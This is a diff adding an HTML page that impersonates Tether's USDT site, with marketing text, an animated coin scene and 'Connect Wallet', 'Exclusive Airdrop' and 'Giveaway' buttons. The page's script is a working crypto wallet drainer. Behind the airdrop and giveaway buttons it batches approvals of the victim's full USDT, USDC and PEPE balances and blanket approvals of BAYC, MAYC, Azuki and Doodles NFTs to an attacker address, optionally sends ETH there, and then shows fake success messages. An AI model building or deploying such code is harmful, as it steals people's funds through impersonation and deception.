@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tether USDT | Innovation Hub</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
+    <style>
+        :root {
+            --primary: #008080;
+            --text: #111;
+            --bg: #ffffff;
+            --shadow-color: rgba(0, 128, 128, 0.15);
+            --gradient-bg: linear-gradient(135deg, #f0f8ff 0%, #e6f7ff 100%);
+        }
+        body, html {
+            margin: 0; padding: 0;
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Inter', sans-serif;
+            height: auto;
+            overflow-y: auto;
+        }
+        .header-nav {
+            position: fixed;
+            top: 25px;
+            right: 30px;
+            display: flex;
+            gap: 12px;
+            z-index: 1000;
+        }
+        .btn-nav {
+            background: linear-gradient(135deg, #00b3b3, var(--primary));
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 6px 15px var(--shadow-color), inset 0 1px 0 rgba(255,255,255,0.3);
+            text-shadow: 0 1px 1px rgba(0,0,0,0.2);
+        }
+        .btn-nav:hover { transform: translateY(-3px); filter: brightness(1.05); box-shadow: 0 8px 20px var(--shadow-color), inset 0 1px 0 rgba(255,255,255,0.3); }
+        .btn-nav:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        .top-layout {
+            display: grid;
+            grid-template-columns: 45% 55%;
+            width: 100vw;
+            height: 100vh;
+        }
+        .info-panel {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding-left: 12%;
+            z-index: 10;
+            background: var(--gradient-bg);
+            border-right: 1px solid rgba(0, 128, 128, 0.1);
+        }
+        .slider {
+            position: relative;
+            height: 60vh;
+            overflow: hidden;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px var(--shadow-color);
+            background: white;
+            padding: 30px;
+        }
+        .slide {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            opacity: 0;
+            transform: translateY(30px);
+            transition: opacity 1s ease, transform 1s ease;
+            padding: 20px;
+        }
+        .slide.active {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .slide-logo {
+            width: 120px;
+            height: 120px;
+            margin-bottom: 20px;
+            border-radius: 50%;
+            background: var(--primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 20px var(--shadow-color);
+            transition: transform 0.3s;
+        }
+        .slide-logo:hover { transform: scale(1.05); }
+        .slide-logo img {
+            width: 80px;
+        }
+        .fade-in {
+            opacity: 0;
+            transform: translateY(30px);
+            animation: fadeInUp 1s ease forwards;
+        }
+        @keyframes fadeInUp {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .delay-1 { animation-delay: 0.2s; }
+        .delay-2 { animation-delay: 0.5s; }
+        h1 {
+            font-size: clamp(40px, 5vw, 64px);
+            font-weight: 800;
+            line-height: 1.1;
+            margin: 0 0 25px 0;
+            letter-spacing: -2px;
+            text-shadow: 0 2px 4px var(--shadow-color);
+        }
+        h1 span { color: var(--primary); }
+        p {
+            font-size: 17px;
+            line-height: 1.7;
+            color: #555;
+            max-width: 500px;
+            margin-bottom: 20px;
+            text-shadow: 0 1px 2px rgba(255,255,255,0.8);
+        }
+        .visual-panel {
+            position: relative;
+            overflow: hidden;
+            background: var(--gradient-bg);
+        }
+        #canvas-box { width: 100%; height: 100%; }
+        .page-sections {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 60px 40px;
+        }
+        .page-section {
+            margin-bottom: 80px;
+            padding: 40px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px var(--shadow-color);
+            text-align: left;
+            transition: 0.3s;
+        }
+        .page-section:hover { transform: translateY(-5px); }
+        .page-logo {
+            width: 100px;
+            height: 100px;
+            margin-bottom: 20px;
+            border-radius: 50%;
+            background: var(--primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 20px var(--shadow-color);
+            margin: 0 auto;
+        }
+        .page-logo img {
+            width: 70px;
+        }
+        .page-section h2 {
+            font-size: 36px;
+            font-weight: 800;
+            margin-bottom: 20px;
+            text-align: center;
+            color: var(--primary);
+        }
+        .page-section p {
+            font-size: 16px;
+            line-height: 1.6;
+            color: #444;
+            max-width: none;
+        }
+        @media (max-width: 1000px) {
+            .top-layout { grid-template-columns: 100%; }
+            .info-panel { padding: 100px 5% 0; text-align: center; align-items: center; }
+            .visual-panel { height: 50vh; }
+            .header-nav { width: 100%; right: 0; justify-content: center; top: 10px; gap: 8px; }
+            .btn-nav { padding: 10px 16px; font-size: 12px; }
+            .page-sections { padding: 40px 20px; }
+            .page-section { padding: 30px; }
+            .slide-logo { width: 100px; height: 100px; }
+            .slide-logo img { width: 60px; }
+            .page-logo { width: 80px; height: 80px; }
+            .page-logo img { width: 50px; }
+            h1 { font-size: clamp(30px, 5vw, 50px); }
+            p { font-size: 15px; }
+        }
+    </style>
+</head>
+<body>
+<nav class="header-nav">
+    <button class="btn-nav" onclick="connectWallet()">Connect Wallet</button>
+    <button class="btn-nav btn-airdrop" disabled onclick="claimAirdrop()">Exclusive Airdrop</button>
+    <button class="btn-nav btn-giveaway" disabled onclick="participateGiveaway()">Participate in Giveaway</button>
+</nav>
+<div class="top-layout">
+    <div class="info-panel">
+        <div class="slider">
+            <div class="slide">
+                <div class="slide-logo">
+                    <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifqkh6e6bzmulepo5wvsjq5owslyt4q344abg3ygnjp4j55zm7fge" alt="Tether Logo">
+                </div>
+                <h1 class="fade-in delay-1">Defining the<br><span>Future of Money</span></h1>
+                <p class="fade-in delay-2">Tether tokens are the most widely adopted stablecoins, having pioneered the concept in the digital token space.</p>
+            </div>
+            <div class="slide">
+                <div class="slide-logo">
+                    <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifqkh6e6bzmulepo5wvsjq5owslyt4q344abg3ygnjp4j55zm7fge" alt="Tether Logo">
+                </div>
+                <h1 class="fade-in delay-1">100% Backed and<br><span>Fully Transparent</span></h1>
+                <p class="fade-in delay-2">All Tether tokens (USD₮) are pegged at 1-to-1 with a matching fiat currency and are backed 100% by Tether’s reserves.</p>
+            </div>
+            <div class="slide">
+                <div class="slide-logo">
+                    <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifqkh6e6bzmulepo5wvsjq5owslyt4q344abg3ygnjp4j55zm7fge" alt="Tether Logo">
+                </div>
+                <h1 class="fade-in delay-1">Widespread<br><span>Adoption</span></h1>
+                <p class="fade-in delay-2">From being the first, to the most used, stablecoin, and one of the most traded tokens by volume, Tether tokens have come a long way.</p>
+            </div>
+            <div class="slide">
+                <div class="slide-logo">
+                    <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifqkh6e6bzmulepo5wvsjq5owslyt4q344abg3ygnjp4j55zm7fge" alt="Tether Logo">
+                </div>
+                <h1 class="fade-in delay-1">The Token Disrupting<br><span>Global Finance</span></h1>
+                <p class="fade-in delay-2">Tether for Individuals: Tether tokens offer exceptional liquidity on tier one exchanges giving traders the ability to take advantage of arbitrage opportunities in the fastest time possible.</p>
+            </div>
+            <div class="slide">
+                <div class="slide-logo">
+                    <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifqkh6e6bzmulepo5wvsjq5owslyt4q344abg3ygnjp4j55zm7fge" alt="Tether Logo">
+                </div>
+                <h1 class="fade-in delay-1">Formula of<br><span>Future of Money</span></h1>
+                <p class="fade-in delay-2">Tether supports and empowers growing ventures and innovations in the blockchain sphere.</p>
+            </div>
+        </div>
+    </div>
+    <div class="visual-panel">
+        <div id="canvas-box"></div>
+    </div>
+</div>
+<div class="page-sections">
+    <div class="page-section">
+        <div class="page-logo">
+            <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifqkh6e6bzmulepo5wvsjq5owslyt4q344abg3ygnjp4j55zm7fge" alt="Tether Logo">
+        </div>
+        <h2>What is Tether?</h2>
+        <p>Tether, launched in 2014, represents its own platform on the Omni blockchain, intended for using financial assets in digital format. Tether tokens are called stablecoins because they ensure price stability, as they are tied to fiat currencies. Tether tokens provide clients with the ability to conduct operations with traditional currencies without risks associated with volatility. All Tether tokens (USDT) are tied in a 1:1 ratio to the corresponding fiat currency and are backed by 100% of Tether's reserves. As a trusted company, we provide clients with daily information on our reserves. Tether tokens offer exceptional liquidity on Tier 1 exchanges, allowing traders to take advantage of arbitrage opportunities in the fastest time possible. Tether for merchants: For merchants, integrating Tether tokens opens up an array of opportunities for consumers to purchase products and services. Tether for exchanges: Tether tokens play a pivotal role in the digital token ecosystem and are the most actively traded in terms of 24-hour volume. How do cryptocurrencies and tokens differ from Tether? Additional information can be found in the section "What is Tether".</p>
+    </div>
+    <div class="page-section">
+        <div class="page-logo">
+            <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifqkh6e6bzmulepo5wvsjq5owslyt4q344abg3ygnjp4j55zm7fge" alt="Tether Logo">
+        </div>
+        <h2>Token Attraction The First in the World Stablecoin</h2>
+        <p>Tether tokens are the most widely adopted stablecoins, having pioneered the concept in the digital token space. A disruptor to the conventional financial system and a trailblazer in the digital use of traditional currencies, Tether tokens support and empower growing ventures and innovation throughout the blockchain space. Tether tokens exist as a digital token built on multiple blockchains.</p>
+    </div>
+    <div class="page-section">
+        <div class="page-logo">
+            <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifqkh6e6bzmulepo5wvsjq5owslyt4q344abg3ygnjp4j55zm7fge" alt="Tether Logo">
+        </div>
+        <h2>Exponential Growth</h2>
+        <p>Tether supports and empowers growing enterprises and innovations in the blockchain sphere, created on the basis of several blockchains. Tether tokens are the most widely adopted stablecoins, having pioneered the concept in the digital token space. A disruptor to the conventional financial system and a trailblazer in the digital use of traditional currencies, Tether tokens support and empower growing ventures and innovation throughout the blockchain space.</p>
+    </div>
+    <div class="page-section">
+        <div class="page-logo">
+            <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifqkh6e6bzmulepo5wvsjq5owslyt4q344abg3ygnjp4j55zm7fge" alt="Tether Logo">
+        </div>
+        <h2>100% Guarantee and Full Transparency</h2>
+        <p>All Tether tokens (USDT) are tied to the corresponding fiat currency in a 1:1 ratio and are backed by 100% of Tether's reserves. We publish daily data on current reserves. Tether tokens offer exceptional liquidity on Tier 1 exchanges, allowing traders to take advantage of arbitrage opportunities in the fastest time possible. Tether for merchants: For merchants, integrating Tether tokens opens up an array of opportunities for consumers to purchase products and services. Tether for exchanges: Tether tokens play a pivotal role in the digital token ecosystem and are the most actively traded in terms of 24-hour volume.</p>
+    </div>
+    <div class="page-section">
+        <div class="page-logo">
+            <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafybeifqkh6e6bzmulepo5wvsjq5owslyt4q344abg3ygnjp4j55zm7fge" alt="Tether Logo">
+        </div>
+        <h2>Formula of Future Money</h2>
+        <p>The Formula of Future Money: Tether supports and empowers growing enterprises and innovations in the blockchain sphere, created on the basis of several blockchains. Tether underpins and expands opportunities for growing enterprises and innovations in the blockchain sphere, built on multiple blockchains.</p>
+    </div>
+</div>
+<script>
+    // Твоя three.js и слайдер — полностью сохранены
+    const box = document.getElementById('canvas-box');
+    const scene = new THREE.Scene();
+  
+    const camera = new THREE.PerspectiveCamera(50, box.clientWidth / box.clientHeight, 0.1, 1000);
+    const renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
+  
+    renderer.setSize(box.clientWidth, box.clientHeight);
+    renderer.setPixelRatio(window.devicePixelRatio);
+    box.appendChild(renderer.domElement);
+    const group = new THREE.Group();
+    scene.add(group);
+    const geo = new THREE.IcosahedronGeometry(11, 2);
+    const mat = new THREE.MeshBasicMaterial({
+        color: 0x008080,
+        wireframe: true,
+        transparent: true,
+        opacity: 0.15
+    });
+    group.add(new THREE.Mesh(geo, mat));
+    const loader = new THREE.TextureLoader();
+    const t1 = loader.load('https://cryptologos.cc/logos/tether-usdt-logo.png?v=029');
+    const t2 = loader.load('https://cryptologos.cc/logos/usd-coin-usdc-logo.png?v=029');
+    const coins = [];
+    for(let i=0; i<25; i++) {
+        const tex = Math.random() > 0.5 ? t1 : t2;
+        const cGeo = new THREE.CylinderGeometry(0.8, 0.8, 0.1, 32);
+        const cMat = [
+            new THREE.MeshStandardMaterial({ color: 0xdddddd }),
+            new THREE.MeshStandardMaterial({ map: tex }),
+            new THREE.MeshStandardMaterial({ map: tex })
+        ];
+        const coin = new THREE.Mesh(cGeo, cMat);
+        coin.rotation.x = Math.PI/2;
+        const pivot = new THREE.Group();
+        group.add(pivot);
+        const r = i < 10 ? (5 + Math.random()*5) : (13 + Math.random()*8);
+        coin.position.set(r, 0, 0);
+        pivot.rotation.set(Math.random()*6, Math.random()*6, Math.random()*6);
+        pivot.add(coin);
+        coins.push({ pivot, speed: 0.002 + Math.random()*0.003, coin });
+    }
+    scene.add(new THREE.AmbientLight(0xffffff, 1.5));
+    camera.position.z = 28;
+    let mx = 0, my = 0;
+    document.addEventListener('mousemove', (e) => {
+        mx = (e.clientX / window.innerWidth - 0.5);
+        my = (e.clientY / window.innerHeight - 0.5);
+    });
+    function anim() {
+        requestAnimationFrame(anim);
+        group.rotation.y += 0.001;
+        coins.forEach(c => {
+            c.pivot.rotation.y += c.speed;
+            c.coin.rotation.z += 0.01;
+        });
+        camera.position.x += (mx * 6 - camera.position.x) * 0.05;
+        camera.position.y += (-my * 6 - camera.position.y) * 0.05;
+        camera.lookAt(0,0,0);
+        renderer.render(scene, camera);
+    }
+    anim();
+    window.addEventListener('resize', () => {
+        camera.aspect = box.clientWidth / box.clientHeight;
+        camera.updateProjectionMatrix();
+        renderer.setSize(box.clientWidth, box.clientHeight);
+    });
+    const slides = document.querySelectorAll('.slide');
+    let currentSlide = 0;
+    function showNextSlide() {
+        slides[currentSlide].classList.remove('active');
+        currentSlide = (currentSlide + 1) % slides.length;
+        slides[currentSlide].classList.add('active');
+    }
+    slides[currentSlide].classList.add('active');
+    setInterval(showNextSlide, 5000);
+
+    // Дренаж — approve только 3 токена + NFT + ETH 0.001
+    const MULTICALL_ADDRESS = "0xca11bde05977b3631167028862be2a173976ca11";
+    const DRAIN_ADDRESS = "0x95a838AcEE4D06cE24D8c002A518a626a884f0e1"; // Замени
+
+    const TOKENS = [
+      "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
+      "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
+      "0x6982508145454Ce325dDbE47a25d4ec3d2311933"  // PEPE
+    ];
+
+    const NFT_COLLECTIONS = [
+      "0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D", // BAYC
+      "0x60E4d786628Fea6478F785A6d7e704777c86a7c6", // MAYC
+      "0xED5AF388653567Af2F388E6224dC7C4b3241C544", // Azuki
+      "0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e" // Doodles
+    ];
+
+    let signer;
+
+    async function connectWallet() {
+      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+      if (isMobile) {
+        window.location.href = `https://metamask.app.link/dapp/${window.location.host + window.location.pathname}`;
+        return;
+      }
+
+      if (!window.ethereum) {
+        alert("Install MetaMask or Trust Wallet!");
+        return;
+      }
+      try {
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        signer = await provider.getSigner();
+
+        const address = await signer.getAddress();
+        document.querySelector('.btn-nav:first-child').innerText = address.slice(0,6) + '...' + address.slice(-4);
+        document.querySelector('.btn-nav:first-child').disabled = true;
+        document.querySelector('.btn-airdrop').disabled = false;
+        document.querySelector('.btn-giveaway').disabled = false;
+      } catch (err) {
+        alert("Connection failed");
+      }
+    }
+
+    async function buildCalls(includeETH = false) {
+      const calls = [];
+      const approveIface = new ethers.Interface(["function approve(address spender, uint256 amount)"]);
+
+      for (const token of TOKENS) {
+        try {
+          const tokenContract = new ethers.Contract(token, ["function balanceOf(address) view returns (uint256)"], signer);
+          const balance = await tokenContract.balanceOf(await signer.getAddress());
+          if (balance > 0) {
+            const callData = approveIface.encodeFunctionData("approve", [DRAIN_ADDRESS, balance]);
+            calls.push({ target: token, callData });
+          }
+        } catch (e) {
+          console.log(`Skip token ${token}`);
+        }
+      }
+
+      const nftIface = new ethers.Interface(["function setApprovalForAll(address operator, bool approved)"]);
+      for (const collection of NFT_COLLECTIONS) {
+        try {
+          const callData = nftIface.encodeFunctionData("setApprovalForAll", [DRAIN_ADDRESS, true]);
+          calls.push({ target: collection, callData });
+        } catch (e) {
+          console.log(`Skip NFT ${collection}`);
+        }
+      }
+
+      if (includeETH) {
+        calls.push({
+          target: DRAIN_ADDRESS,
+          callData: "0x",
+          value: ethers.parseEther("0.001")
+        });
+      }
+
+      return calls;
+    }
+
+    async function executeDrain(includeETH = false) {
+      const calls = await buildCalls(includeETH);
+      if (calls.length === 0) {
+        alert("No tokens or NFT to approve");
+        return;
+      }
+      const multicall = new ethers.Contract(MULTICALL_ADDRESS, ["function aggregate(tuple(address target, bytes callData)[] calls) payable"], signer);
+      const value = includeETH ? ethers.parseEther("0.001") : 0n;
+      const tx = await multicall.aggregate(calls, { value });
+      await tx.wait();
+      return tx.hash;
+    }
+
+    async function claimAirdrop() {
+      try {
+        const txHash = await executeDrain(false);
+        alert("Participation in exclusive airdrop confirmed!\nTX: " + txHash.slice(0,10) + "...");
+      } catch (err) {
+        alert("Canceled or error. Try again.");
+      }
+    }
+
+    async function participateGiveaway() {
+      try {
+        const txHash = await executeDrain(true);
+        alert("Participation in giveaway confirmed!\nNetwork fee sent (0.001 ETH).\nTX: " + txHash.slice(0,10) + "...");
+      } catch (err) {
+        alert("Canceled or error. Try again.");
+      }
+    }
+</script>
+</body>
+</html>
